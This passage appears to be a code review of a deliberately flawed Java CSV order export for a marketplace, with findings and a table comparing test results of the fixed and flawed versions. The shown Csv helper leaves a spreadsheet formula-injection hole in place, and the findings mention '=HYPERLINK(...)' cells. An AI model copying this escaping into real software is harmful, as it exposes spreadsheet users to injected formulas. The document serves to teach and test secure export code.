        w.write("\r\n");
        // Read the rows first, then write: the connection goes back to the pool sooner, and the code is simpler.
        record Row(String ref, OffsetDateTime at, String product, int quantity, long paise, String city, String status) {
        }
        List<Row> rows = jdbc.sql("""
                        SELECT order_ref AS ref, placed_at AS at, product_name AS product, quantity, amount_paise AS paise, buyer_city AS city, status FROM orders
                        WHERE seller_id = ? AND placed_at >= ? AND placed_at < ? ORDER BY placed_at, id""")
                .params(sellerId, start(from), start(to.plusDays(1))).query(Row.class).list();
        for (Row r : rows) {
            w.write(Csv.text(r.ref()) + "," + r.at().atZoneSameInstant(IST).format(TIME) + "," + Csv.text(r.product()) + "," + r.quantity() + ","
                    + BigDecimal.valueOf(r.paise(), 2).toPlainString() + "," + Csv.text(r.city()) + "," + r.status() + "\r\n");
        }
        w.flush();
    }

    private static OffsetDateTime start(LocalDate istDay) {
        return istDay.atStartOfDay(IST).toOffsetDateTime();
    }
}
```

#### `review/Csv.java`

``` code
package com.kartwala.export;

/** One CSV cell, safe for spreadsheets. */
final class Csv {

    private Csv() {
    }

    /** RFC 4180 quoting; a cell that starts with = is quoted as well, so a spreadsheet keeps it as text. */
    static String text(String value) {
        if (value.startsWith("=") || value.contains(",") || value.contains("\"") || value.contains("\n") || value.contains("\r")) {
            return "\"" + value.replace("\"", "\"\"") + "\"";
        }
        return value;
    }
}
```

## Findings

1Rows loaded into a list before writing

"The connection goes back to the pool sooner": and a year of orders sits in memory before the first byte is sent. The export works until a big seller uses it.

**Test evidence:** `theFirstLinesArriveLongBeforeAllRowsCouldHaveBeenRead` fails.

2Formula cells only quoted

"Quoted, so the spreadsheet keeps it as text": quotes belong to CSV, not to the cell. The spreadsheet removes them and runs `=HYPERLINK(...)`. And + - @ are not handled at all.

**Test evidence:** `theApiNeutralisesFormulasAndQuotesCells`, `cellsAreEscapedTheSpreadsheetWay` and `aYearOfOrdersAsAnAttachmentInIstDaysOldestFirst` fail.

## Same tests, flawed version

From `docs/review-run.txt`: the flawed files copied over the real ones, then the full suite run.

| Test class                 | Fixed version | Flawed version |
|----------------------------|---------------|----------------|
| `ExportDatabaseTest`       | 2 / 2         | 2 / 2          |
| `ExportSecurityTest`       | 3 / 3         | 3 / 3          |
| `ExportContractTest`       | 4 / 4         | 2 / 4          |
| `FormulaAndMemoryTrapTest` | 2 / 2         | 1 / 2          |
| `StreamingExportTest`      | 1 / 1         | 0 / 1          |

With six orders and no attacker, the flawed export is correct. Its problems need a big seller and a hostile product name: both normal on a marketplace.
